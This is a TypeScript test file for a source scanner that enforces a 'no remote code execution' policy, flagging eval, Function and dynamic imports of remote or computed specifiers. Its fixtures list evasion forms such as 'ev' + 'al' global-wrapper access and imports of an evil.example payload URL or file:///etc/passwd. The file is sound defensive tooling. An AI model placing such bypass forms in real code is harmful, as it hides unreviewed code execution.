import { readFileSync, statSync } from 'node:fs';
import { relative } from 'node:path';
import * as ts from 'typescript';
import { describe, expect, it } from 'vitest';

import {
  REPO_ROOT,
  SRC_ROOT,
  type SourceFinding,
  classifyImportSpecifier,
  collectLineExemptions,
  getAccessPath,
  isComputedGlobalWrapperAccess,
  isDynamicImportCall,
  isInTypePosition,
  lineText,
  parseSource,
  pathResolvesTo,
  walkTsFiles,
} from './source-policy';

// PUL-Q007 — no remote code execution.
//
// Statement: "The runtime SHALL NOT use `eval`, `new Function`,
// dynamic `import()` of remote URLs at runtime, or any equivalent
// mechanism that would execute code not present in the published
// bundle."
//
// Enforcement: a Vitest source scan over `src/**/*.ts`. The scanner
// flags every runtime-value reference to `eval` / `Function` and
// every dynamic `import(...)` whose specifier is a remote URL or a
// non-static expression. Type-position references (interface members
// named `eval`, `typeof eval` in a type alias, JSDoc
// `{@link import('./mod').T}`) are intentionally NOT flagged — they
// are compile-time artifacts and do not execute code at runtime.
//
// Exemption: a line-scoped `// PUL-Q007-allow: <reason>` marker
// excludes a single line from the scan. Empty / whitespace-only
// rationales are rejected; markers hidden inside string literals are
// rejected; the marker applies only to its own line.

const ALLOW_TAG = 'PUL-Q007-allow';

interface Q007Finding extends SourceFinding {}

function findingsOf(source: string, file = 'fake.ts'): readonly Q007Finding[] {
  const sf = parseSource(source, file);
  return scanQ007(sf);
}

// True when `node` is the `.name` portion of a property access /
// qualified name — i.e., a key position rather than a value-read.
function isPropertyNamePosition(node: ts.Identifier): boolean {
  const parent = node.parent;
  if (!parent) return false;
  if (
    (ts.isPropertyAccessExpression(parent) || ts.isQualifiedName(parent)) &&
    'name' in parent &&
    parent.name === node
  ) {
    return true;
  }
  return false;
}

// True when `node` is being declared (`const eval = ...`,
// `function eval() {}`, `interface I { eval(): void }`, etc.).
function isDeclarationName(node: ts.Identifier): boolean {
  const parent = node.parent;
  if (!parent) return false;
  if (ts.isVariableDeclaration(parent) && parent.name === node) return true;
  if (ts.isParameter(parent) && parent.name === node) return true;
  if (ts.isFunctionDeclaration(parent) && parent.name === node) return true;
  if (ts.isClassDeclaration(parent) && parent.name === node) return true;
  if (ts.isInterfaceDeclaration(parent) && parent.name === node) return true;
  if (ts.isTypeAliasDeclaration(parent) && parent.name === node) return true;
  if (ts.isEnumDeclaration(parent) && parent.name === node) return true;
  if (ts.isEnumMember(parent) && parent.name === node) return true;
  if (ts.isMethodDeclaration(parent) && parent.name === node) return true;
  if (ts.isMethodSignature(parent) && parent.name === node) return true;
  if (ts.isPropertyDeclaration(parent) && parent.name === node) return true;
  if (ts.isPropertySignature(parent) && parent.name === node) return true;
  if (ts.isPropertyAssignment(parent) && parent.name === node) return true;
  if (ts.isBindingElement(parent) && parent.name === node) return true;
  if (ts.isImportSpecifier(parent)) return true;
  if (ts.isImportClause(parent) && parent.name === node) return true;
  if (ts.isNamespaceImport(parent)) return true;
  if (ts.isExportSpecifier(parent)) return true;
  return false;
}

function scanQ007(sourceFile: ts.SourceFile): readonly Q007Finding[] {
  const exempted = collectLineExemptions(sourceFile, ALLOW_TAG);
  const findings: Q007Finding[] = [];
  const seen = new Set<string>();

  const record = (node: ts.Node, label: string): void => {
    const start = node.getStart(sourceFile);
    const key = `${start}::${label}`;
    if (seen.has(key)) return;
    seen.add(key);
    const { line } = sourceFile.getLineAndCharacterOfPosition(start);
    if (exempted.has(line)) return;
    findings.push({
      file: sourceFile.fileName,
      line: line + 1,
      text: lineText(sourceFile, line).trim(),
      label,
    });
  };

  const visit = (node: ts.Node): void => {
    // 1. Identifier reads: bare `eval` / `Function` in a value
    //    position. We use `isInTypePosition` to skip TypeScript type
    //    annotations (`(fn: Function) => void`, `typeof eval`),
    //    `isDeclarationName` to skip the binding site, and
    //    `isPropertyNamePosition` to skip the `.name` of a member
    //    expression.
    if (ts.isIdentifier(node) && !isInTypePosition(node) && !isDeclarationName(node)) {
      if (!isPropertyNamePosition(node)) {
        if (node.text === 'eval') record(node, 'eval (value read)');
        if (node.text === 'Function') record(node, 'Function (value read)');
      }
    }

    // 2. `<global-wrapper>.eval` / `<global-wrapper>.Function` access
    //    chains. Resolved through `getAccessPath` so wrappers and
    //    string-subscript bracket access (`globalThis['eval']`) are
    //    covered. A computed subscript on a global wrapper
    //    (`globalThis['ev' + 'al']`) is conservatively flagged via
    //    `isComputedGlobalWrapperAccess` — it cannot be resolved
    //    statically and is exactly the bypass pattern an attacker
    //    would use to hide an `eval` / `Function` access.
    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      if (!isInTypePosition(node)) {
        const path = getAccessPath(node);
        if (path) {
          if (pathResolvesTo(path, 'eval')) record(node, 'eval (global wrapper)');
          if (pathResolvesTo(path, 'Function')) record(node, 'Function (global wrapper)');
        } else if (isComputedGlobalWrapperAccess(node)) {
          record(node, 'computed global wrapper access (possible eval / Function bypass)');
        }
      }
    }

    // 3. Dynamic `import(specifier)` — flag when specifier is a
    //    remote URL or a non-static expression. Static-local-package
    //    specifiers are allowed (`import('./module')`, `import('howler')`).
    if (isDynamicImportCall(node) && !isInTypePosition(node)) {
      const arg = node.arguments[0];
      if (arg) {
        const kind = classifyImportSpecifier(arg);
        if (kind === 'static-remote-url') {
          record(node, 'dynamic import of remote URL');
        } else if (kind === 'non-static') {
          record(node, 'dynamic import of non-static specifier');
        }
      } else {
        // `import()` with no arguments is malformed code; flag it
        // generously so a future refactor that strips the arg doesn't
        // accidentally clear the gate.
        record(node, 'dynamic import without specifier');
      }
    }

    ts.forEachChild(node, visit);
  };
  visit(sourceFile);
  return findings;
}

// --- Tests -----------------------------------------------------------

describe('PUL-Q007 — no remote code execution (source scan)', () => {
  describe('scanner self-tests', () => {
    describe('direct constructions', () => {
      it.each([
        ['eval (value read)', "eval('1+2');"],
        ['eval (value read)', 'const e = eval;'],
        ['eval (value read)', "(0, eval)('1+2');"],
        ['Function (value read)', "new Function('return 1');"],
        ['Function (value read)', "Function('a', 'return a');"],
        ['Function (value read)', 'const F = Function;'],
      ])('flags %s — %s', (label, source) => {
        const findings = findingsOf(source);
        expect(findings.map((f) => f.label)).toContain(label);
      });
    });

    describe('global-wrapper forms', () => {
      // Every entry in `GLOBAL_WRAPPERS` (`globalThis`, `window`, `self`,
      // `global`) must appear at least once for both `eval` and
      // `Function` so a regression that drops one wrapper from the set
      // fails here. Without `global` coverage, a Node.js-adjacent
      // runtime would bypass the gate with `global.eval(payload)` /
      // `new global.Function(code)` while every existing test stayed
      // green.
      it.each([
        ['eval (global wrapper)', "globalThis.eval('1+2');"],
        ['eval (global wrapper)', "window.eval('1+2');"],
        ['eval (global wrapper)', "self.eval('1+2');"],
        ['eval (global wrapper)', "global.eval('1+2');"],
        ['eval (global wrapper)', "globalThis['eval']('1+2');"],
        ['Function (global wrapper)', "new globalThis.Function('return 1');"],
        ['Function (global wrapper)', "window.Function('a', 'return a');"],
        ['Function (global wrapper)', "self.Function('a', 'return a');"],
        ['Function (global wrapper)', "new global.Function('return 1');"],
        ['Function (global wrapper)', "globalThis['Function']('return 1');"],
      ])('flags %s — %s', (label, source) => {
        const findings = findingsOf(source);
        expect(findings.map((f) => f.label)).toContain(label);
      });
    });

    describe('computed global wrapper access (bypass defense)', () => {
      // Same per-wrapper coverage discipline as the literal-subscript
      // group above: every entry in `GLOBAL_WRAPPERS` is exercised at
      // least once here so a regression that drops one (especially
      // `global`, a Node.js-adjacent bypass surface) fails this group.
      it.each([
        "globalThis['ev' + 'al']('payload');",
        "window['Fun' + 'ction']('return 1');",
        "self[`ev${'al'}`]('payload');",
        "global['ev' + 'al']('payload');",
        "globalThis[someKey]('payload');",
        "globalThis[(condition ? 'eval' : 'noop')]('payload');",
      ])('flags computed wrapper access — `%s`', (source) => {
        const findings = findingsOf(
          `declare const someKey: string; declare const condition: boolean; ${source}`,
        );
        expect(findings.map((f) => f.label)).toContain(
          'computed global wrapper access (possible eval / Function bypass)',
        );
      });

      it('does NOT flag computed access on a non-global root', () => {
        const findings = findingsOf(
          "declare const obj: Record<string, (s: string) => unknown>; declare const k: string; obj[k]('x');",
        );
        expect(findings).toEqual([]);
      });

      it('does NOT flag string-literal subscript on a global wrapper (already handled by the literal path)', () => {
        // `globalThis['eval']` is a literal subscript: getAccessPath
        // resolves it cleanly and the `eval (global wrapper)` finding
        // fires. The computed-access detector must NOT also fire,
        // otherwise the same line would carry two findings.
        const findings = findingsOf("globalThis['eval']('1+2');");
        const labels = findings.map((f) => f.label);
        expect(labels).toContain('eval (global wrapper)');
        expect(labels).not.toContain(
          'computed global wrapper access (possible eval / Function bypass)',
        );
      });
    });

    describe('dynamic import', () => {
      it.each([
        ['dynamic import of remote URL', "import('https://evil.example/payload.js');"],
        ['dynamic import of remote URL', "import('http://localhost/x.js');"],
        ['dynamic import of remote URL', "import('//cdn.example/x.js');"],
        ['dynamic import of non-static specifier', 'declare const url: string; import(url);'],
        [
          'dynamic import of non-static specifier',
          'declare const name: string; import(`./${name}.js`);',
        ],
      ])('flags %s — %s', (label, source) => {
        const findings = findingsOf(source);
        expect(findings.map((f) => f.label)).toContain(label);
      });

      it('does NOT flag a static local dynamic import', () => {
        const findings = findingsOf("import('./module.js');");
        expect(findings).toEqual([]);
      });

      it('does NOT flag a static package-name dynamic import', () => {
        const findings = findingsOf("import('howler');");
        expect(findings).toEqual([]);
      });

      it.each([
        ['data:', "import('data:text/javascript,console.log(1)');"],
        ['blob:', "import('blob:https://example.com/abc-123');"],
        ['file:', "import('file:///etc/passwd');"],
        ['node:', "import('node:fs');"],
        ['absolute filesystem path', "import('/absolute/payload.js');"],
        ['chrome-extension:', "import('chrome-extension://abc/payload.js');"],
        ['javascript:', "import('javascript:alert(1)');"],
      ])('flags non-http URL scheme (%s)', (_label, source) => {
        const findings = findingsOf(source);
        expect(findings.map((f) => f.label)).toContain('dynamic import of remote URL');
      });

      it('flags an empty-string dynamic import specifier', () => {
        // An empty string is not a valid local path or package name;
        // any path resolution would be runtime-determined, which is
        // exactly the surprise-execution-path hazard Q007 forbids.
        const findings = findingsOf("import('');");
        expect(findings.map((f) => f.label)).toContain('dynamic import of remote URL');
      });

      it('does NOT flag a scoped-package specifier (`@scope/pkg`)', () => {
        const findings = findingsOf("import('@spectacle/theme');");
        expect(findings).toEqual([]);
      });
    });

    describe('TypeScript wrapper unwrapping', () => {
      it('flags `(eval)("...")`', () => {
        const findings = findingsOf("(eval)('1+2');");
        expect(findings.map((f) => f.label)).toContain('eval (value read)');
      });

      it('flags `(globalThis as any).eval`', () => {
        const findings = findingsOf("(globalThis as any).eval('1+2');");
        expect(findings.map((f) => f.label)).toContain('eval (global wrapper)');
      });

      it('flags `import(("https://x" as string))`', () => {
        const findings = findingsOf(`import(('https://evil.example/x.js' as string));`);
        expect(findings.map((f) => f.label)).toContain('dynamic import of remote URL');
      });
    });

    describe('false-positive defense', () => {
      it('does NOT flag JSDoc `{@link import("./path").Symbol}` (type-position)', () => {
        const src = [
          '/**',
          " * Foo is {@link import('./mod').Bar}.",
          ' */',
          'export type Foo = number;',
        ].join('\n');
        expect(findingsOf(src)).toEqual([]);
      });

      it('does NOT flag a `(fn: Function) => void` type annotation', () => {
        const findings = findingsOf('export const wrap = (fn: Function): void => fn();');
        expect(findings.map((f) => f.label)).not.toContain('Function (value read)');
      });

      it('does NOT flag `typeof eval` in a type alias', () => {
        const findings = findingsOf('type Eval = typeof eval;');
        expect(findings.map((f) => f.label)).not.toContain('eval (value read)');
      });

      it('does NOT flag the property name `eval` in a property assignment', () => {
        const findings = findingsOf('const obj = { eval: 1 };');
        expect(findings.map((f) => f.label)).not.toContain('eval (value read)');
      });

      it('does NOT flag the property name `Function` in a property assignment', () => {
        const findings = findingsOf('const obj = { Function: 1 };');
        expect(findings.map((f) => f.label)).not.toContain('Function (value read)');
      });

      it('does NOT flag a method named `eval` on a class', () => {
        const findings = findingsOf('class C { eval() {} }');
        expect(findings.map((f) => f.label)).not.toContain('eval (value read)');
      });

      it('does NOT flag an interface member named `eval`', () => {
        const findings = findingsOf('interface I { eval(input: string): unknown; }');
        expect(findings.map((f) => f.label)).not.toContain('eval (value read)');
      });

      it('does NOT flag forbidden vocabulary inside a `//` comment', () => {
        expect(findingsOf('// eval and new Function are forbidden')).toEqual([]);
      });

      it('does NOT flag forbidden vocabulary inside a `/* */` block comment', () => {
        const src = '/* eval, new Function, dynamic import. */ const x = 1;';
        expect(findingsOf(src)).toEqual([]);
      });

      it('does NOT flag `eval` inside a string literal', () => {
        const findings = findingsOf("const note = 'eval is forbidden';");
        expect(findings).toEqual([]);
      });

      it('does NOT flag `obj.eval` where `obj` is a non-global local', () => {
        const findings = findingsOf(
          'declare const obj: { eval: (input: string) => unknown }; obj.eval("1+2");',
        );
        expect(findings.map((f) => f.label)).not.toContain('eval (global wrapper)');
      });

      it('does NOT flag `obj.Function` where `obj` is a non-global local', () => {
        const findings = findingsOf(
          'declare const obj: { Function: (a: string) => unknown }; obj.Function("a");',
        );
        expect(findings.map((f) => f.label)).not.toContain('Function (global wrapper)');
      });

      it('does NOT flag the legitimate `import.meta` access (it is not `import()`)', () => {
        const findings = findingsOf('const v = (import.meta as { url: string }).url;');
        expect(findings).toEqual([]);
      });
    });

    describe('exemption marker', () => {
      it('honors `// PUL-Q007-allow: <reason>` on the same line', () => {
        const findings = findingsOf("eval('audit-only'); // PUL-Q007-allow: documented audit shim");
        expect(findings).toEqual([]);
      });

      it('rejects an empty rationale', () => {
        const findings = findingsOf("eval('x'); // PUL-Q007-allow:");
        expect(findings.map((f) => f.label)).toContain('eval (value read)');
      });

      it('rejects a whitespace-only rationale', () => {
        const findings = findingsOf("eval('x'); // PUL-Q007-allow:   ");
        expect(findings.map((f) => f.label)).toContain('eval (value read)');
      });

      it('rejects a marker hidden inside a string literal', () => {
        const findings = findingsOf(`const note = "// PUL-Q007-allow: hidden"; eval('x');`);
        expect(findings.map((f) => f.label)).toContain('eval (value read)');
      });

      it('does NOT honor a marker on a different line (line-scoped)', () => {
        const src = "// PUL-Q007-allow: see above\neval('x');";
        const findings = findingsOf(src);
        expect(findings).toHaveLength(1);
        expect(findings[0]?.line).toBe(2);
      });
    });

    describe('reporting', () => {
      it('reports the 1-based line and file path on every finding', () => {
        const src = "const a = 1;\nconst b = 2;\neval('x');\nconst c = 3;";
        const findings = findingsOf(src, 'src/runtime/example.ts');
        expect(findings).toHaveLength(1);
        expect(findings[0]).toMatchObject({
          file: 'src/runtime/example.ts',
          line: 3,
          label: 'eval (value read)',
        });
      });

      it('reports findings across multiple lines independently', () => {
        const src = "eval('x');\nnew Function('return 1');";
        const findings = findingsOf(src);
        expect(findings).toHaveLength(2);
        expect(findings[0]?.line).toBe(1);
        expect(findings[1]?.line).toBe(2);
      });
    });
  });

  describe('runtime tree (current code revision)', () => {
    it('scan root `src/` exists and contains at least one .ts file', () => {
      expect(statSync(SRC_ROOT).isDirectory()).toBe(true);
      expect(walkTsFiles(SRC_ROOT).length).toBeGreaterThan(0);
    });

    it('contains no Q007 violations across `src/**/*.ts`', () => {
      const files = walkTsFiles(SRC_ROOT);
      const findings: Q007Finding[] = [];
      for (const file of files) {
        const text = readFileSync(file, 'utf-8');
        const rel = relative(REPO_ROOT, file);
        const sf = parseSource(text, rel);
        findings.push(...scanQ007(sf));
      }
      const header =
        'PUL-Q007 forbids `eval`, `new Function`, dynamic `import()` of remote URLs or non-static specifiers in runtime source. Add a `// PUL-Q007-allow: <reason>` exemption on the same line if the use is intentional and CSP-compatible.';
      const detail = findings.map((f) => `  ${f.file}:${f.line}  ${f.label}  ${f.text}`).join('\n');
      const message = findings.length === 0 ? '' : `${header}\n${detail}`;
      expect(findings, message).toEqual([]);
    });
  });
});
